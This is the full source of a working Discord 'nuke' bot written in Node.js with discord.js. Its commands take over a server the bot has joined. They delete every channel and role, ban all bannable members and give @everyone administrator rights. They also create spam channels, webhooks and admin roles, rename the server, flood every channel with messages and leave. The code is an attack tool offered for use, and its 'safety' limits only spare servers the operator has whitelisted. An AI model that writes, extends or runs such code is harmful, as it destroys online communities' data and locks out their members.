const { Client, GatewayIntentBits, EmbedBuilder, ChannelType, SlashCommandBuilder, Routes, WebhookClient, PermissionsBitField } = require('discord.js');
const { REST } = require('@discordjs/rest');
const express = require('express');
const axios = require('axios');
const config = require('./config');
const fs = require('fs');
const path = require('path');

// Initialize configurations
const nukerConfig = config.nuker;
const generalConfig = config.general;
const safetyConfig = config.safety;

// Bot initialization
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.GuildWebhooks,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildBans,
        GatewayIntentBits.GuildEmojisAndStickers,
        GatewayIntentBits.GuildIntegrations
    ]
});

// State variables
let isStopped = false;
let spamChannels = [];
let commandChannelId = null;
let operationStartTime = null;
let bannedCount = 0;
let rolesCreated = 0;
let webhooksCreated = 0;

// =====================
// UPTIME MONITOR SETUP
// =====================
const monitor = express();
const MONITOR_PORT = generalConfig.uptimePort;

monitor.get('/', (req, res) => {
    res.status(200).json({
        status: 'online',
        bot: client?.user?.tag || 'not ready',
        uptime: process.uptime(),
        operations: {
            active: !isStopped,
            runningFor: operationStartTime ? Date.now() - operationStartTime : 0,
            channelsCreated: spamChannels.length,
            membersBanned: bannedCount,
            rolesCreated: rolesCreated,
            webhooksCreated: webhooksCreated
        }
    });
});

monitor.listen(MONITOR_PORT, () => {
    console.log(`Uptime monitor running on port ${MONITOR_PORT}`);
});

// =====================
// SLASH COMMANDS SETUP
// =====================
const slashCommands = [
    new SlashCommandBuilder()
        .setName('kynhelp')
        .setDescription('Show help for Kyn Nuke Bot'),
    new SlashCommandBuilder()
        .setName('kynnuke')
        .setDescription('Full server nuke (delete channels, ban members, etc.)')
        .addBooleanOption(option =>
            option.setName('confirm')
                .setDescription('Confirm you want to nuke the server')
                .setRequired(true)),
    new SlashCommandBuilder()
        .setName('kynspam')
        .setDescription('Spam all channels with messages'),
    new SlashCommandBuilder()
        .setName('kynclear')
        .setDescription('Clear all bot messages'),
    new SlashCommandBuilder()
        .setName('kynstop')
        .setDescription('Stop all current operations'),
    new SlashCommandBuilder()
        .setName('kynstatus')
        .setDescription('Show current nuke status')
].map(command => command.toJSON());

// =====================
// ENHANCED HELPER FUNCTIONS
// =====================
async function checkSafetyLimits(interaction) {
    if (isStopped) {
        if (interaction) await interaction.editReply('🛑 Operation stopped by admin');
        return false;
    }
    
    if (operationStartTime && (Date.now() - operationStartTime) > safetyConfig.maxOperationTime) {
        if (interaction) await interaction.editReply('🛑 Safety limit: Maximum operation time reached');
        isStopped = true;
        return false;
    }
    
    return true;
}

async function deleteAllChannels(guild) {
    if (!nukerConfig.behavior.deleteChannels) return 0;
    
    let deletedCount = 0;
    const channels = guild.channels.cache;
    
    for (const channel of channels.values()) {
        if (!await checkSafetyLimits()) break;
        if (channel.id === commandChannelId) continue;
        
        try {
            await channel.delete();
            deletedCount++;
            await new Promise(resolve => setTimeout(resolve, nukerConfig.timing.channelDeleteDelay));
        } catch (error) {
            console.error(`Couldn't delete channel ${channel.name}:`, error);
        }
    }
    
    return deletedCount;
}

async function createSpamChannels(guild) {
    if (!nukerConfig.behavior.createChannels) return [];
    
    const channels = [];
    const createCount = Math.min(nukerConfig.channelCount, safetyConfig.maxChannelsToCreate);
    
    for (let i = 0; i < createCount; i++) {
        if (!await checkSafetyLimits()) break;
        
        const name = nukerConfig.channelNames[Math.floor(Math.random() * nukerConfig.channelNames.length)];
        
        try {
            const channel = await guild.channels.create({
                name: `${name}-${i+1}`,
                type: ChannelType.GuildText
            });
            
            channels.push(channel);
            await new Promise(resolve => setTimeout(resolve, nukerConfig.timing.channelCreateDelay));
            
            if (nukerConfig.behavior.createWebhooks) {
                webhooksCreated += await createWebhooks(channel);
            }
            
        } catch (error) {
            console.error(`Couldn't create channel ${name}:`, error);
        }
    }
    
    return channels;
}

async function createWebhooks(channel) {
    let created = 0;
    const createCount = Math.min(nukerConfig.webhooks.createCount, safetyConfig.maxWebhooksToCreate);
    
    for (let i = 0; i < createCount; i++) {
        if (!await checkSafetyLimits()) break;
        
        const name = nukerConfig.webhooks.names[
            Math.floor(Math.random() * nukerConfig.webhooks.names.length)
        ];
        
        try {
            const webhook = await channel.createWebhook({
                name: `${name}-${i+1}`,
                avatar: nukerConfig.serverIcon
            });
            
            const message = nukerConfig.webhooks.messages[
                Math.floor(Math.random() * nukerConfig.webhooks.messages.length)
            ];
            
            await sendWebhookMessage(webhook, message);
            created++;
            await new Promise(resolve => setTimeout(resolve, nukerConfig.timing.webhookCreateDelay));
            
        } catch (error) {
            console.error(`Couldn't create webhook in ${channel.name}:`, error);
        }
    }
    
    return created;
}

async function sendWebhookMessage(webhook, content) {
    try {
        const webhookClient = new WebhookClient({ url: webhook.url });
        await webhookClient.send(content);
        return true;
    } catch (error) {
        console.error(`Couldn't send webhook message:`, error);
        return false;
    }
}

async function manageRoles(guild) {
    let rolesDeleted = 0;
    let rolesCreated = 0;
    
    // Delete existing roles
    if (nukerConfig.behavior.deleteRoles) {
        const roles = guild.roles.cache;
        
        for (const role of roles.values()) {
            if (!await checkSafetyLimits()) break;
            if (role.managed || role.id === guild.roles.everyone.id) continue;
            
            try {
                await role.delete();
                rolesDeleted++;
                await new Promise(resolve => setTimeout(resolve, nukerConfig.timing.roleDeleteDelay));
            } catch (error) {
                console.error(`Couldn't delete role ${role.name}:`, error);
            }
        }
    }
    
    // Create new roles
    if (nukerConfig.behavior.createRoles) {
        const createCount = Math.min(nukerConfig.roles.createCount, safetyConfig.maxRolesToCreate);
        
        for (let i = 0; i < createCount; i++) {
            if (!await checkSafetyLimits()) break;
            
            const name = nukerConfig.roles.names[
                Math.floor(Math.random() * nukerConfig.roles.names.length)
            ];
            
            const color = nukerConfig.roles.colors[
                Math.floor(Math.random() * nukerConfig.roles.colors.length)
            ];
            
            try {
                await guild.roles.create({
                    name: `${name}-${i+1}`,
                    color: color,
                    hoist: nukerConfig.roles.hoist,
                    mentionable: nukerConfig.roles.mentionable,
                    permissions: [PermissionsBitField.Flags.Administrator]
                });
                rolesCreated++;
                await new Promise(resolve => setTimeout(resolve, nukerConfig.timing.roleCreateDelay));
            } catch (error) {
                console.error(`Couldn't create role ${name}:`, error);
            }
        }
    }
    
    return { deleted: rolesDeleted, created: rolesCreated };
}

async function banAllMembers(guild) {
    if (!nukerConfig.behavior.banMembers) return 0;
    
    let banned = 0;
    const members = await guild.members.fetch();
    
    for (const member of members.values()) {
        if (!await checkSafetyLimits()) break;
        
        if (nukerConfig.allowedUserIds.includes(member.id) || 
            member.id === client.user.id || 
            !member.bannable) continue;
        
        try {
            await member.ban();
            banned++;
            bannedCount++;
            await new Promise(resolve => setTimeout(resolve, nukerConfig.timing.banDelay));
        } catch (error) {
            console.error(`Couldn't ban ${member.user.tag}:`, error);
        }
    }
    
    return banned;
}

async function editServerInfo(guild) {
    if (!nukerConfig.behavior.editServerInfo) return;
    
    try {
        await guild.setIcon(nukerConfig.serverIcon);
        await guild.setName(nukerConfig.serverName);
        await new Promise(resolve => setTimeout(resolve, nukerConfig.timing.serverEditDelay));
    } catch (error) {
        console.error("Couldn't edit server info:", error);
    }
}

async function spamChannelsFunc(guild) {
    if (!nukerConfig.behavior.spamMessages) return;
    
    const channels = guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText);
    
    for (let i = 0; i < nukerConfig.spamRounds; i++) {
        if (!await checkSafetyLimits()) break;
        
        const messageContent = nukerConfig.spammedMessages[i % nukerConfig.spammedMessages.length];
        
        for (const channel of channels.values()) {
            try {
                await channel.send(messageContent);
                await new Promise(resolve => setTimeout(resolve, nukerConfig.timing.messageSendDelay));
            } catch (error) {
                console.error(`Couldn't send message in ${channel.name}:`, error);
            }
        }
        
        if (!isStopped && i < nukerConfig.spamRounds - 1) {
            await new Promise(resolve => setTimeout(resolve, nukerConfig.timing.spamRoundDelay));
        }
    }
}

// Grant @everyone admin permissions
async function giveEveryoneAdmin(guild) {
    if (!nukerConfig.giveEveryoneAdmin) return;

    try {
        const everyoneRole = guild.roles.everyone;
        await everyoneRole.setPermissions([PermissionsBitField.Flags.Administrator]);
        console.log('Granted @everyone admin permissions.');
    } catch (error) {
        console.error("Couldn't grant @everyone admin permissions:", error);
    }
}

// Leave the server quietly
async function leaveServerQuietly(guild) {
    if (!nukerConfig.leaveQuietly) return false;

    try {
        console.log('Leaving server quietly...');
        await guild.leave();
        return true;
    } catch (error) {
        console.error("Couldn't leave server quietly:", error);
        return false;
    }
}

// Backup server data
async function backupServerData(guild) {
    if (!nukerConfig.backupNuke?.enabled) return;

    const backupDir = path.resolve(nukerConfig.backupNuke.saveTo);
    if (!fs.existsSync(backupDir)) {
        fs.mkdirSync(backupDir, { recursive: true });
    }

    const data = {
        serverSettings: nukerConfig.backupNuke.include.serverSettings ? {
            name: guild.name,
            id: guild.id,
            iconURL: guild.iconURL({ dynamic: true, size: 1024 }),
            splashURL: guild.splashURL({ dynamic: true, size: 1024 }),
            bannerURL: guild.bannerURL({ dynamic: true, size: 1024 }),
            description: guild.description,
            verificationLevel: guild.verificationLevel,
            defaultMessageNotifications: guild.defaultMessageNotifications,
            explicitContentFilter: guild.explicitContentFilter,
            preferredLocale: guild.preferredLocale,
            afkChannel: guild.afkChannel?.name || null,
            afkTimeout: guild.afkTimeout
        } : null,
        roles: nukerConfig.backupNuke.include.roles ? guild.roles.cache.map(role => ({
            name: role.name,
            id: role.id,
            color: role.color,
            hoist: role.hoist,
            position: role.position,
            permissions: role.permissions.bitfield.toString(),
            mentionable: role.mentionable
        })) : null,
        channels: nukerConfig.backupNuke.include.channels ? guild.channels.cache.map(channel => ({
            name: channel.name,
            id: channel.id,
            type: channel.type,
            position: channel.position,
            parent: channel.parent?.name || null
        })) : null
    };

    const backupFile = path.join(backupDir, `${guild.id}_${Date.now()}.json`);
    fs.writeFileSync(backupFile, JSON.stringify(data, null, 2));
    console.log(`[BACKUP] Saved server data for ${guild.name} to ${backupFile}`);
    return backupFile;
}

// Restore server data
async function restoreServerData(guild, backupFile) {
    if (!fs.existsSync(backupFile)) {
        console.error(`[RESTORE] Backup file not found: ${backupFile}`);
        return;
    }

    try {
        const backupData = JSON.parse(fs.readFileSync(backupFile, 'utf8'));

        // Restore server settings
        if (backupData.serverSettings) {
            await guild.setName(backupData.serverSettings.name);
            await guild.setIcon(backupData.serverSettings.iconURL);
        }

        // Restore roles
        if (backupData.roles) {
            for (const roleData of backupData.roles) {
                try {
                    await guild.roles.create({
                        name: roleData.name,
                        color: roleData.color,
                        hoist: roleData.hoist,
                        mentionable: roleData.mentionable,
                        permissions: BigInt(roleData.permissions)
                    });
                } catch (error) {
                    console.error(`Couldn't restore role ${roleData.name}:`, error);
                }
            }
        }

        // Restore channels
        if (backupData.channels) {
            for (const channelData of backupData.channels) {
                try {
                    await guild.channels.create({
                        name: channelData.name,
                        type: channelData.type,
                        parent: channelData.parent
                    });
                } catch (error) {
                    console.error(`Couldn't restore channel ${channelData.name}:`, error);
                }
            }
        }

        console.log(`[RESTORE] Successfully restored server data from ${backupFile}`);
    } catch (error) {
        console.error(`[RESTORE] Error restoring server:`, error);
    }
}

// =====================
// COMMAND HANDLERS
// =====================
client.on('ready', async () => {
    console.log(`Logged in as ${client.user.tag}!`);
    client.user.setActivity('/kynhelp', { type: 'PLAYING' });
    
    // Register slash commands
    try {
        const rest = new REST({ version: '10' }).setToken(nukerConfig.token);
        console.log('Started refreshing application (/) commands.');
        await rest.put(
            Routes.applicationCommands(client.user.id),
            { body: slashCommands }
        );
        console.log('Successfully reloaded application (/) commands.');
    } catch (error) {
        console.error('Error refreshing slash commands:', error);
    }
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isCommand()) return;
    
    // Permission check
    if (!nukerConfig.allowedUserIds.includes(interaction.user.id)) {
        return interaction.reply({ content: '❌ You are not authorized to use this bot.', ephemeral: true });
    }
    
    // Server whitelist check
    if (['kynnuke', 'kynspam'].includes(interaction.commandName) && 
        nukerConfig.whitelistedServerIds.includes(interaction.guild.id)) {
        return interaction.reply({ 
            content: '❌ This server is whitelisted and cannot be nuked.', 
            ephemeral: true 
        });
    }
    
    try {
        await interaction.deferReply({ ephemeral: true });
        
        // Command: /kynstop
        if (interaction.commandName === 'kynstop') {
            isStopped = true;
            return interaction.editReply('🛑 All operations stopped!');
        }
        
        // Command: /kynstatus
        if (interaction.commandName === 'kynstatus') {
            const statusEmbed = new EmbedBuilder()
                .setTitle('💣 Nuke Status')
                .addFields(
                    { name: 'Active', value: isStopped ? 'No' : 'Yes', inline: true },
                    { name: 'Channels Created', value: spamChannels.length.toString(), inline: true },
                    { name: 'Members Banned', value: bannedCount.toString(), inline: true },
                    { name: 'Roles Created', value: rolesCreated.toString(), inline: true },
                    { name: 'Webhooks Created', value: webhooksCreated.toString(), inline: true },
                    { name: 'Running Time', value: operationStartTime ? 
                        `${Math.floor((Date.now() - operationStartTime)/1000)}s` : 'Not running', inline: true }
                )
                .setColor(isStopped ? '#00FF00' : '#FF0000');
            
            return interaction.editReply({ embeds: [statusEmbed] });
        }
        
        // Reset stop flag for other commands
        isStopped = false;
        operationStartTime = Date.now();
        
        // Command: /kynhelp
        if (interaction.commandName === 'kynhelp') {
            const helpEmbed = new EmbedBuilder()
                .setTitle('💣 Kyn Nuke Bot Help')
                .addFields(
                    { name: '/kynnuke', value: 'Full server destruction' },
                    { name: '/kynspam', value: 'Channel spam' },
                    { name: '/kynclear', value: 'Delete bot messages' },
                    { name: '/kynstop', value: 'Stop current operations' },
                    { name: '/kynstatus', value: 'Show current status' }
                )
                .setColor('#FF0000');
            
            await interaction.user.send({ embeds: [helpEmbed] })
                .then(() => interaction.editReply('✅ Help sent to your DMs!'))
                .catch(() => interaction.editReply("❌ Couldn't send DM. Check your privacy settings!"));
            return;
        }
        
        // Command: /kynspam
        if (interaction.commandName === 'kynspam') {
            commandChannelId = interaction.channel.id;
            await interaction.editReply('💣 Starting channel spam...');
            await spamChannelsFunc(interaction.guild);
            return interaction.editReply(isStopped ? '🛑 Spam stopped!' : '✅ Channel spam complete!');
        }
        
        // Command: /kynnuke
        if (interaction.commandName === 'kynnuke') {
            if (!interaction.options.getBoolean('confirm')) {
                return interaction.editReply('❌ Nuke cancelled - confirmation not given');
            }
            
            commandChannelId = interaction.channel.id;
            const guild = interaction.guild;
            
            await interaction.editReply('💣 Starting nuke procedure...');
            await new Promise(resolve => setTimeout(resolve, nukerConfig.timing.initialOperationDelay));
            
            // Edit server info first
            await editServerInfo(guild);
            
            // PHASE 1: DELETIONS
            await interaction.editReply('💣 Starting deletion phase...');
            
            // Delete roles first
            const rolesResult = await manageRoles(guild);
            if (!await checkSafetyLimits(interaction)) return;
            
            // Then delete channels
            const channelsDeleted = await deleteAllChannels(guild);
            if (!await checkSafetyLimits(interaction)) return;
            
            // PHASE 2: BANS
            await interaction.editReply('💣 Starting ban phase...');
            bannedCount = await banAllMembers(guild);
            if (!await checkSafetyLimits(interaction)) return;
            
            // PHASE 3: CREATIONS
            await interaction.editReply('💣 Starting creation phase...');
            
            // Create roles if configured
            if (nukerConfig.behavior.createRoles) {
                const createCount = Math.min(nukerConfig.roles.createCount, safetyConfig.maxRolesToCreate);
                rolesCreated = 0;
                
                for (let i = 0; i < createCount; i++) {
                    if (!await checkSafetyLimits()) break;
                    
                    const name = nukerConfig.roles.names[
                        Math.floor(Math.random() * nukerConfig.roles.names.length)
                    ];
                    
                    const color = nukerConfig.roles.colors[
                        Math.floor(Math.random() * nukerConfig.roles.colors.length)
                    ];
                    
                    try {
                        await guild.roles.create({
                            name: `${name}-${i+1}`,
                            color: color,
                            hoist: nukerConfig.roles.hoist,
                            mentionable: nukerConfig.roles.mentionable,
                            permissions: [PermissionsBitField.Flags.Administrator]
                        });
                        rolesCreated++;
                        await new Promise(resolve => setTimeout(resolve, nukerConfig.timing.roleCreateDelay));
                    } catch (error) {
                        console.error(`Couldn't create role ${name}:`, error);
                    }
                }
            }
            
            // Create channels if configured
            spamChannels = [];
            if (nukerConfig.behavior.createChannels) {
                spamChannels = await createSpamChannels(guild);
                if (!await checkSafetyLimits(interaction)) return;
            }
            
            // PHASE 4: SPAM
            await interaction.editReply('💣 Starting spam phase...');
            await spamChannelsFunc(guild);
            
            // Leave server if configured
            if (nukerConfig.behavior.leaveServerAfterNuke) {
                await guild.leave();
            }
            
            // Final report
            return interaction.editReply(
                isStopped ? '🛑 Nuke stopped!' : 
                `✅ Nuke complete!\n` +
                `- Banned ${bannedCount} members\n` +
                `- Deleted ${channelsDeleted} channels\n` +
                `- Created ${spamChannels.length} channels\n` +
                `- Created ${rolesCreated} roles\n` +
                `- Created ${webhooksCreated} webhooks`
            );
        }
        
        // Command: /kynclear
        if (interaction.commandName === 'kynclear') {
            commandChannelId = interaction.channel.id;
            await interaction.editReply('🧹 Clearing all bot messages...');
            
            try {
                let deletedCount = 0;
                const channels = interaction.guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText);
                
                for (const channel of channels.values()) {
                    if (!await checkSafetyLimits()) break;
                    
                    try {
                        const messages = await channel.messages.fetch({ limit: 100 });
                        const toDelete = messages.filter(msg => msg.author.id === client.user.id);
                        
                        if (toDelete.size > 0) {
                            if (toDelete.size === 1) {
                                await toDelete.first().delete();
                                deletedCount++;
                            } else {
                                await channel.bulkDelete(toDelete);
                                deletedCount += toDelete.size;
                            }
                        }
                    } catch (error) {
                        console.error(`Error clearing messages in ${channel.name}:`, error);
                    }
                    
                    await new Promise(resolve => setTimeout(resolve, nukerConfig.timing.messageDeleteDelay));
                }
                
                return interaction.editReply(`✅ Cleared ${deletedCount} bot messages.`);
            } catch (error) {
                console.error('Error during clear:', error);
                return interaction.editReply('⚠️ Message clearing completed with some errors.');
            }
        }
        
    } catch (error) {
        console.error('Error handling command:', error);
        if (!interaction.replied) {
            await interaction.editReply('❌ An error occurred while processing your command.').catch(console.error);
        }
    }
});

// Handle legacy text commands
client.on('messageCreate', async message => {
    if (!message.content.startsWith(generalConfig.commandPrefix) || message.author.bot) return;
    
    const args = message.content.slice(generalConfig.commandPrefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();
    commandChannelId = message.channel.id;
    
    // Permission check
    if (!nukerConfig.allowedUserIds.includes(message.author.id)) {
        return message.reply('❌ You are not authorized to use this bot.').catch(console.error);
    }
    
    // Server whitelist check
    if (['kynnuke', 'kynspam'].includes(command) && 
        nukerConfig.whitelistedServerIds.includes(message.guild.id)) {
        return message.reply('❌ This server is whitelisted and cannot be nuked.').catch(console.error);
    }
    
    // Command: !kynstop
    if (command === 'kynstop') {
        isStopped = true;
        return message.reply('🛑 All operations stopped!').catch(console.error);
    }
    
    // Reset stop flag for other commands
    isStopped = false;
    operationStartTime = Date.now();
    
    // Command: !kynhelp
    if (command === 'kynhelp') {
        const helpEmbed = new EmbedBuilder()
            .setTitle('💣 Kyn Nuke Bot Help')
            .addFields(
                { name: `${generalConfig.commandPrefix}kynnuke`, value: 'Full server destruction' },
                { name: `${generalConfig.commandPrefix}kynspam`, value: 'Channel spam' },
                { name: `${generalConfig.commandPrefix}kynclear`, value: 'Delete bot messages' },
                { name: `${generalConfig.commandPrefix}kynstop`, value: 'Stop current operations' }
            )
            .setColor('#FF0000');
        
        try {
            await message.author.send({ embeds: [helpEmbed] });
            await message.reply('✅ Help sent to your DMs!').catch(console.error);
        } catch (error) {
            await message.reply("❌ Couldn't send DM. Check your privacy settings!").catch(console.error);
        }
        return;
    }
    
    // Command: !kynspam
    if (command === 'kynspam') {
        await message.reply('💣 Starting channel spam...').catch(console.error);
        await spamChannelsFunc(message.guild);
        return message.reply(isStopped ? '🛑 Spam stopped!' : '✅ Channel spam complete!').catch(console.error);
    }
    
    // Command: !kynnuke
    if (command === 'kynnuke') {
        const guild = message.guild;
        spamChannels = [];
        bannedCount = 0;
        rolesCreated = 0;
        webhooksCreated = 0;
        
        try {
            await message.reply('💣 Starting nuke procedure...').catch(console.error);
            await new Promise(resolve => setTimeout(resolve, nukerConfig.timing.initialOperationDelay));
            
            // Edit server info first
            await editServerInfo(guild);
            
            // PHASE 1: DELETIONS
            await message.reply('💣 Starting deletion phase...').catch(console.error);
            
            // Delete roles first
            const rolesResult = await manageRoles(guild);
            if (!await checkSafetyLimits()) return;
            
            // Then delete channels
            const channelsDeleted = await deleteAllChannels(guild);
            if (!await checkSafetyLimits()) return;
            
            // PHASE 2: BANS
            await message.reply('💣 Starting ban phase...').catch(console.error);
            bannedCount = await banAllMembers(guild);
            if (!await checkSafetyLimits()) return;
            
            // PHASE 3: CREATIONS
            await message.reply('💣 Starting creation phase...').catch(console.error);
            
            // Create roles if configured
            if (nukerConfig.behavior.createRoles) {
                const createCount = Math.min(nukerConfig.roles.createCount, safetyConfig.maxRolesToCreate);
                rolesCreated = 0;
                
                for (let i = 0; i < createCount; i++) {
                    if (!await checkSafetyLimits()) break;
                    
                    const name = nukerConfig.roles.names[
                        Math.floor(Math.random() * nukerConfig.roles.names.length)
                    ];
                    
                    const color = nukerConfig.roles.colors[
                        Math.floor(Math.random() * nukerConfig.roles.colors.length)
                    ];
                    
                    try {
                        await guild.roles.create({
                            name: `${name}-${i+1}`,
                            color: color,
                            hoist: nukerConfig.roles.hoist,
                            mentionable: nukerConfig.roles.mentionable,
                            permissions: [PermissionsBitField.Flags.Administrator]
                        });
                        rolesCreated++;
                        await new Promise(resolve => setTimeout(resolve, nukerConfig.timing.roleCreateDelay));
                    } catch (error) {
                        console.error(`Couldn't create role ${name}:`, error);
                    }
                }
            }
            
            // Create channels if configured
            spamChannels = [];
            if (nukerConfig.behavior.createChannels) {
                spamChannels = await createSpamChannels(guild);
                if (!await checkSafetyLimits()) return;
            }
            
            // PHASE 4: SPAM
            await message.reply('💣 Starting spam phase...').catch(console.error);
            await spamChannelsFunc(guild);
            
            // Leave server if configured
            if (nukerConfig.behavior.leaveServerAfterNuke) {
                await guild.leave();
                return;
            }
            
            // Final report
            return message.reply(
                `✅ Nuke complete!\n` +
                `- Banned ${bannedCount} members\n` +
                `- Deleted ${channelsDeleted} channels\n` +
                `- Created ${spamChannels.length} channels\n` +
                `- Created ${rolesCreated} roles\n` +
                `- Created ${webhooksCreated} webhooks`
            ).catch(console.error);
            
        } catch (error) {
            console.error('Error during nuke:', error);
            return message.reply('⚠️ Nuke partially completed with some errors.').catch(console.error);
        }
    }
    
    // Command: !kynclear
    if (command === 'kynclear') {
        try {
            await message.reply('🧹 Clearing all bot messages...').catch(console.error);
            
            let deletedCount = 0;
            const channels = message.guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText);
            
            for (const channel of channels.values()) {
                if (!await checkSafetyLimits()) break;
                
                try {
                    const messages = await channel.messages.fetch({ limit: 100 });
                    const toDelete = messages.filter(msg => msg.author.id === client.user.id);
                    
                    if (toDelete.size > 0) {
                        if (toDelete.size === 1) {
                            await toDelete.first().delete();
                            deletedCount++;
                        } else {
                            await channel.bulkDelete(toDelete);
                            deletedCount += toDelete.size;
                        }
                    }
                } catch (error) {
                    console.error(`Error clearing messages in ${channel.name}:`, error);
                }
                
                await new Promise(resolve => setTimeout(resolve, nukerConfig.timing.messageDeleteDelay));
            }
            
            return message.reply(`✅ Cleared ${deletedCount} bot messages.`).catch(console.error);
        } catch (error) {
            console.error('Error during clear:', error);
            return message.reply('⚠️ Message clearing completed with some errors.').catch(console.error);
        }
    }
});

// =====================
// ERROR HANDLING
// =====================
process.on('unhandledRejection', error => {
    console.error('Unhandled promise rejection:', error);
});

process.on('uncaughtException', error => {
    console.error('Uncaught exception:', error);
});

// =====================
// START THE BOT
// =====================
client.login(nukerConfig.token)
    .then(() => console.log('Bot login initiated'))
    .catch(err => {
        console.error('Login failed:', err);
        process.exit(1);
    });

// Cleanup on exit
process.on('exit', () => {
    console.log('Bot shutting down...');
});